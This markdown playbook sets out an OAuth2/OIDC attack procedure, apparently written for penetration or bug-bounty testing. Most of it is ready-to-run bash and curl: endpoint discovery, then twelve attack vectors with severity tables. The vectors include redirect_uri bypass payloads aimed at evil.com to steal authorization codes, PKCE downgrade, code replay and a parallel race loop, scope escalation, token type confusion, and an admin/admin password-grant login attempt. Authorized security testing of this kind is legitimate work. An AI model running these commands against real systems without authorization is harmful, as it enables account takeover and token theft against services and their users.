# OAUTH2-OIDC-PLAYBOOK.md — OAuth2/OIDC State Machine Attack Surface

Activated when OAuth2/OIDC flow is detected during recon. The JWT Arsenal tests the token. This playbook tests the protocol that issues the token.

**The most destructive auth vulns are not in the JWT itself but in the OAuth flow that emits it.**

---

## Detection Triggers

ANY of these signals activates this playbook during Phase 2:

| Signal | Detection Method | Confidence |
|--------|-----------------|------------|
| OpenID Configuration | `/.well-known/openid-configuration` returns 200 | HIGH |
| OAuth authorize endpoint | `/oauth/authorize`, `/authorize`, `/auth/authorize` returns 302 | HIGH |
| OAuth token endpoint | `/oauth/token`, `/token` accepts POST | HIGH |
| OAuth in JS bundles | `grep -P 'oauth|openid|authorize|client_id|redirect_uri|code_challenge' bundles.js` | HIGH |
| OAuth wrapper in deps | next-auth, passport-oauth2, authlib (OAuth), spring-security-oauth2, omniauth | HIGH |
| Social login buttons | Google/GitHub/Discord/Twitter login in UI | MEDIUM |
| `code` param in URLs | `?code=...&state=...` in evidence/ | MEDIUM |

### Detection Script

```bash
TARGET="https://{domain}"
API="https://{api_domain}"

echo "=== OAuth2/OIDC Detection ==="

# OpenID discovery
OIDC=$(curl -s "${API}/.well-known/openid-configuration" 2>/dev/null)
echo "$OIDC" | jq '{issuer, authorization_endpoint, token_endpoint, jwks_uri, response_types_supported, grant_types_supported, scopes_supported}' 2>/dev/null && echo "[OIDC] OpenID Configuration found"

# OAuth endpoint probing
for path in /oauth/authorize /authorize /auth/authorize /oauth2/authorize /oauth/token /token /auth/token /oauth2/token /oauth/revoke /revoke /oauth/introspect /introspect /oauth/userinfo /userinfo /oauth/callback /callback /auth/callback; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${API}${path}" 2>/dev/null)
  [ "$code" != "000" ] && [ "$code" != "404" ] && echo "[OAUTH] $code $path"
done

# Social OAuth providers
curl -s "${TARGET}" | grep -oP 'accounts\.google\.com|github\.com/login/oauth|discord\.com/api/oauth2|api\.twitter\.com/oauth' | sort -u

# JS bundle signals
grep -oP 'client_id["\s:=]+["\x27]([a-zA-Z0-9._-]+)["\x27]' evidence/web/js-bundles/all-bundles.js 2>/dev/null
grep -oP 'redirect_uri["\s:=]+["\x27]([^"\x27]+)["\x27]' evidence/web/js-bundles/all-bundles.js 2>/dev/null
```

---

## OAuth2 State Machine Model

```
         ┌──────────────────────────────────────────┐
         │            Authorization Server           │
         │                                          │
    ┌────┼──── /authorize ◄── redirect_uri ─────────┼──┐
    │    │         │                                 │  │
    │    │    ┌────▼────┐    ┌──────────┐           │  │
    │    │    │  state   │    │  PKCE    │           │  │
    │    │    │  check   │    │  check   │           │  │
    │    │    └────┬────┘    └────┬─────┘           │  │
    │    │         │              │                  │  │
    │    │    ┌────▼──────────────▼────┐            │  │
    │    │    │    Authorization Code   │            │  │
    │    │    └────────────┬───────────┘            │  │
    │    │                 │                         │  │
    │    │    ┌────────────▼───────────┐            │  │
    │    │    │     /token exchange     │            │  │
    │    │    │  (code → access_token)  │            │  │
    │    │    └────────────┬───────────┘            │  │
    │    │                 │                         │  │
    │    │    ┌────────────▼───────────┐            │  │
    │    │    │  access_token + id_token│            │  │
    │    │    │  + refresh_token        │            │  │
    │    │    └────────────┬───────────┘            │  │
    │    │                 │                         │  │
    │    │    ┌────────────▼───────────┐            │  │
    │    │    │     /refresh             │            │  │
    │    │    │  (refresh → new access)  │            │  │
    │    │    └────────────┬───────────┘            │  │
    │    │                 │                         │  │
    │    │    ┌────────────▼───────────┐            │  │
    │    │    │     /revoke              │            │  │
    │    │    └─────────────────────────┘            │  │
    │    └──────────────────────────────────────────┘  │
    │                                                   │
    └─── Client App ────────────────────────────────────┘
```

**Every arrow is an attack surface. Every state transition can be fuzzed.**

---

## Attack Vectors (12 vectors, test ALL)

### V1: State Parameter — CSRF via Authorization

```bash
AUTHZ_URL="https://{auth_server}/authorize"
CLIENT_ID="{client_id}"  # from JS bundles or OIDC config
REDIRECT_URI="{redirect_uri}"  # from JS bundles

# 1. Request WITHOUT state parameter
curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=openid"
# If 302 without error → FINDING: state parameter not required (CSRF)

# 2. Request with EMPTY state
curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=openid&state="
# If 302 → FINDING: empty state accepted

# 3. Request with PREDICTABLE state
curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=openid&state=1"
curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=openid&state=2"
# If both 302 and callback doesn't validate → FINDING: predictable state

# 4. State replay — use same state across sessions
# If accepted → FINDING: state not bound to session
```

### V2: Redirect URI Manipulation — Token Theft via Open Redirect

```bash
AUTHZ_URL="https://{auth_server}/authorize"

# Exact match bypass attempts
for uri in \
  "https://evil.com" \
  "https://{domain}.evil.com" \
  "https://{domain}@evil.com" \
  "https://{domain}%40evil.com" \
  "https://{domain}/callback/../../../evil" \
  "https://{domain}/callback?next=https://evil.com" \
  "https://{domain}/callback#@evil.com" \
  "https://{domain}/callback/..%2f..%2f" \
  "https://{domain}%2f@evil.com" \
  "https://evil.com%23@{domain}" \
  "https://{domain}/callback%00.evil.com" \
  "http://{domain}/callback" \
  "https://{domain}/callback/../open-redirect?url=evil.com" \
  ; do
  echo "--- Testing: $uri ---"
  curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$uri'))")&scope=openid&state=test" 2>/dev/null | head -5
done
# Any 302 to attacker-controlled URI → CRITICAL: Authorization code theft
```

### V3: PKCE Downgrade — Authorization Code Interception

```bash
TOKEN_URL="https://{auth_server}/token"

# 1. Check if PKCE is required
# Request authorization without code_challenge
curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=openid&state=test"
# If 302 (success without PKCE) → FINDING: PKCE not enforced

# 2. If PKCE used — try exchanging code WITHOUT code_verifier
curl -s -X POST "${TOKEN_URL}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code={auth_code}&redirect_uri=${REDIRECT_URI}&client_id=${CLIENT_ID}"
# If returns tokens → CRITICAL: PKCE verification skipped at token exchange

# 3. PKCE method downgrade — use plain instead of S256
curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=openid&state=test&code_challenge=test&code_challenge_method=plain"
# If accepted → FINDING: Plain PKCE accepted (S256 should be required)
```

### V4: Token Exchange Confusion — Access Token as ID Token

```bash
TOKEN_URL="https://{auth_server}/token"

# 1. Get tokens normally
TOKENS=$(curl -s -X POST "${TOKEN_URL}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code={auth_code}&redirect_uri=${REDIRECT_URI}&client_id=${CLIENT_ID}&client_secret={secret}&code_verifier={verifier}")

ACCESS=$(echo "$TOKENS" | jq -r '.access_token')
ID=$(echo "$TOKENS" | jq -r '.id_token')
REFRESH=$(echo "$TOKENS" | jq -r '.refresh_token')

# 2. Use access_token where id_token is expected
curl -s "${API}/protected" -H "Authorization: Bearer $ID"
# If 200 → FINDING: ID token accepted as access token (token type confusion)

# 3. Use refresh_token as access_token
curl -s "${API}/protected" -H "Authorization: Bearer $REFRESH"
# If 200 → CRITICAL: Refresh token accepted as access token

# 4. Decode and compare audiences
echo "$ACCESS" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{aud, iss, azp, scope}'
echo "$ID" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{aud, iss, azp, nonce}'
# If same audience → token confusion possible
```

### V5: Issuer Confusion — Multi-Tenant Attacks

```bash
# If OIDC config found, check issuer validation
ISSUER=$(echo "$OIDC" | jq -r '.issuer')

# 1. Craft token with different issuer, sign with own key
# (Use JWT Arsenal shared/tokens.py for token crafting)

# 2. Check if API validates issuer at all
# Decode existing JWT and check claims
echo "{bearer_token}" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{iss, aud, sub}'

# 3. For multi-tenant: try tokens from tenant A on tenant B
# If accepted → CRITICAL: Cross-tenant token acceptance

# 4. Check JWKS URI — is it per-tenant or shared?
curl -s "$(echo "$OIDC" | jq -r '.jwks_uri')" | jq '.keys | length'
```

### V6: Scope Escalation

```bash
AUTHZ_URL="https://{auth_server}/authorize"

# 1. Request more scopes than authorized
curl -sI "${AUTHZ_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=openid+profile+email+admin+write&state=test"
# Check consent screen or response for granted scopes

# 2. Add scopes during token refresh
curl -s -X POST "${TOKEN_URL}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token&refresh_token=${REFRESH}&scope=openid+profile+admin&client_id=${CLIENT_ID}"
# If returns token with escalated scopes → CRITICAL

# 3. Check scope enforcement per endpoint
# Get token with minimal scope, try accessing admin endpoint
curl -s "${API}/admin/users" -H "Authorization: Bearer ${ACCESS}"
# If 200 → FINDING: Scope not enforced on resource server
```

### V7: Grant Type Confusion

```bash
TOKEN_URL="https://{auth_server}/token"

# 1. Try client_credentials grant (server-to-server, no user)
curl -s -X POST "${TOKEN_URL}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=client_credentials&client_id=${CLIENT_ID}&client_secret={secret}"
# If returns token → check what it can access

# 2. Try password grant (direct credentials)
curl -s -X POST "${TOKEN_URL}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&username=admin&password=admin&client_id=${CLIENT_ID}"
# If enabled → FINDING: Resource Owner Password grant active (deprecated, high risk)

# 3. Try implicit grant
curl -sI "${AUTHZ_URL}?response_type=token&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=openid&state=test"
# If returns access_token in fragment → FINDING: Implicit grant enabled (deprecated)

# 4. Try device code grant
curl -s -X POST "${API}/oauth/device" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${CLIENT_ID}&scope=openid"
# If returns device_code → check for phishing potential
```

### V8: Token Revocation Bypass

```bash
# 1. Revoke a token
curl -s -X POST "${API}/oauth/revoke" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "token=${ACCESS}&token_type_hint=access_token&client_id=${CLIENT_ID}"

# 2. Try using revoked token
curl -s "${API}/protected" -H "Authorization: Bearer ${ACCESS}"
# If 200 → CRITICAL: Revoked tokens still accepted

# 3. Try using refresh token to get new access token after revocation
curl -s -X POST "${TOKEN_URL}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token&refresh_token=${REFRESH}&client_id=${CLIENT_ID}"
# If returns new tokens → FINDING: Refresh token not revoked with access token
```

### V9: Authorization Code Replay

```bash
# 1. Exchange authorization code
TOKENS=$(curl -s -X POST "${TOKEN_URL}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code={auth_code}&redirect_uri=${REDIRECT_URI}&client_id=${CLIENT_ID}&code_verifier={verifier}")

# 2. Try exchanging the SAME code again
REPLAY=$(curl -s -X POST "${TOKEN_URL}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code={auth_code}&redirect_uri=${REDIRECT_URI}&client_id=${CLIENT_ID}&code_verifier={verifier}")

echo "$REPLAY" | jq .
# If returns tokens → CRITICAL: Authorization code reuse (must be single-use per RFC 6749 §4.1.2)
```

### V10: Client Authentication Bypass

```bash
# 1. Token exchange without client_secret (if confidential client)
curl -s -X POST "${TOKEN_URL}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code={auth_code}&redirect_uri=${REDIRECT_URI}&client_id=${CLIENT_ID}"
# If returns tokens without secret → FINDING: Client not authenticated

# 2. Try other client_ids
curl -s -X POST "${TOKEN_URL}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code={auth_code}&redirect_uri=${REDIRECT_URI}&client_id=different_client"
# If returns tokens → CRITICAL: Code not bound to client_id
```

### V11: OAuth Callback Race Condition

```bash
# Rapidly exchange same code from different sessions
for i in $(seq 1 10); do
  curl -s -X POST "${TOKEN_URL}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=authorization_code&code={auth_code}&redirect_uri=${REDIRECT_URI}&client_id=${CLIENT_ID}&code_verifier={verifier}" &
done
wait
# Multiple successes → FINDING: Race condition in code exchange
```

### V12: Wrapper-Specific Vulnerabilities

Check which OAuth wrapper is used and test known vulns:

| Wrapper | Detection | Known Vulns |
|---------|-----------|-------------|
| next-auth / Auth.js | `grep 'next-auth\|@auth/core' bundles.js` | CVE-2023-48309 (CSRF), session strategy confusion |
| passport-oauth2 | `grep 'passport.*oauth' package.json` | Callback URL validation bypass |
| authlib (OAuth) | `grep 'authlib.*oauth' requirements.txt` | Same patterns as JWT (AUTH-001 equivalent in OAuth) |
| spring-security-oauth2 | `actuator/` endpoints, Java stack | Open redirect in default config |
| omniauth | `grep 'omniauth' Gemfile` | CVE-2015-9284 (CSRF), request forgery |
| django-allauth | `grep 'allauth' requirements.txt` | Social account takeover via email |

---

## OAuth Wrapper Cross-Library Differential

Same principle as JWT Arsenal Tool 7 — test the same OAuth flow against multiple wrappers to find divergences:

| Test Case | next-auth | passport | authlib | spring-oauth2 | Expected |
|-----------|-----------|----------|---------|---------------|----------|
| No state param | ? | ? | ? | ? | REJECT |
| Empty redirect_uri | ? | ? | ? | ? | REJECT |
| No PKCE | ? | ? | ? | ? | REJECT (public client) |
| Implicit grant | ? | ? | ? | ? | REJECT (2024+) |
| Code replay | ? | ? | ? | ? | REJECT |
| Token as code | ? | ? | ? | ? | REJECT |

Every `?` that becomes ACCEPT when Expected=REJECT is a finding lead.

---

## Finding Integration

| Vector | Severity if Found | Kill Gate Notes |
|--------|------------------|-----------------|
| V1: No state | HIGH | Q5: CSRF → account takeover if user visits attacker link |
| V2: redirect_uri bypass | CRITICAL | Q5: Token theft → full account takeover |
| V3: PKCE downgrade | CRITICAL | Q5: Code interception on public clients (mobile/SPA) |
| V4: Token type confusion | HIGH | Q1: Check if by design (some APIs accept both) |
| V5: Issuer confusion | CRITICAL | Q5: Cross-tenant only if multi-tenant |
| V6: Scope escalation | HIGH-CRITICAL | Q4: Check if scope enforced at resource server |
| V7: Deprecated grants | MEDIUM-HIGH | Q6: Well-known but still prevalent |
| V8: Revocation bypass | HIGH | Q5: Depends on token lifetime |
| V9: Code replay | HIGH | Q6: RFC requires single-use |
| V10: Client auth bypass | CRITICAL | Q2: Verify code is bound to client |
| V11: Race condition | HIGH | Q5: Timing-dependent |
| V12: Wrapper CVE | VARIES | Q8: Check if patched version deployed |

---

## Time Budget

| Step | Time |
|------|------|
| OAuth detection (Phase 2) | 5 min |
| OIDC config analysis | 10 min |
| V1-V3 (state, redirect, PKCE) | 20 min |
| V4-V6 (token confusion, issuer, scope) | 20 min |
| V7-V12 (grants, revoke, replay, wrapper) | 20 min |
| **Total** | **~75 min** |
